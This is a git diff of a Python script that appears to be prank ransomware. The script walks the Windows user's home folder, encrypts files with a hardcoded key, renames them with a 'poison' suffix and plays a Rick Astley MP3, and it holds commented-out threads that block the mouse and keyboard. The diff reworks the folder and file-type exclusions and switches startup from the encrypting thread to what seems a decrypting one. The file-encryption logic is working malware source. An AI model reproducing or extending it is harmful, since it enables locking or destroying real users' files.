@@ -19,9 +19,9 @@ executing = True
 filename = "".join(["\\", __file__.split('\\')[-1].split('.')[0], ".exe"])
 KEY: Final = b'171yM5aII7w0cM2C0EtD9yOlU71d4vooktwHOIsoZ6I='
 DEST_PATH: Final = f"C:\\Users\\{getuser()}"
-DIR_EXCLUSIONS: Final = ["backup", "AppData"]
+DIR_EXCLUSIONS: Final = ["backup", "AppData", "encrypt.py"]
 FILE_SUFFIX: Final = "poison"
-FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "ini", "DAT", "LOG1", "LOG2", "blf", "regtrans-ms"]
+FILE_SUFFIX_EXCLUSIONS: Final = [FILE_SUFFIX, "exe", "ini", "DAT", "LOG1", "LOG2", "blf", "regtrans-ms", "gitconfig"]
 URL: Final = ("https://ia903206.us.archive.org/31/items/rick-astley-never-gonna-give-you-up/Rick%20Astley%20-%20Never%20Gonna%20Give%20You%20Up.mp3")
 
 
@@ -37,13 +37,24 @@ class Encryption(threading.Thread):
 
     def getDecryptedFiles(self):
         file_paths = []
-        for root, dirs, files in os.walk(self.DEST_PATH):
-            for file in files:
-                if (not root.split("\\")[-1] in self.DIR_EXCLUSIONS):
-                    full_path = f"{root}\\{file}"
-                    if (not file.split(".")[-1] in self.FILE_SUFFIX_EXCLUSIONS):
-                        file_paths.append(full_path)
-        return (file_paths)
+        filtered_file_paths = []
+
+        for root, dirs, files in os.walk(DEST_PATH):
+            for file in files: 
+                full_path = f"{root}\\{file}"
+                if (not file.split(".")[-1] in FILE_SUFFIX_EXCLUSIONS):
+                    file_paths.append(full_path)
+                    
+        for file_path in file_paths:
+            exception = False
+            for dir_exclusion in DIR_EXCLUSIONS:
+                if(file_path.__contains__(dir_exclusion)):
+                    exception = True
+            if(not exception):
+                print(file_path)
+                filtered_file_paths.append(file_path)
+        
+        return filtered_file_paths
     
     def stopThread(self):
         self.stop = True
@@ -206,6 +217,6 @@ snake.pack(pady=20)
 #threading.Thread(target=disable_mouse, daemon=True).start()
 #threading.Thread(target=block_keys, daemon=True).start()
 
-# ec.start()
+dc.start()
 
-window.mainloop()
+# window.mainloop()
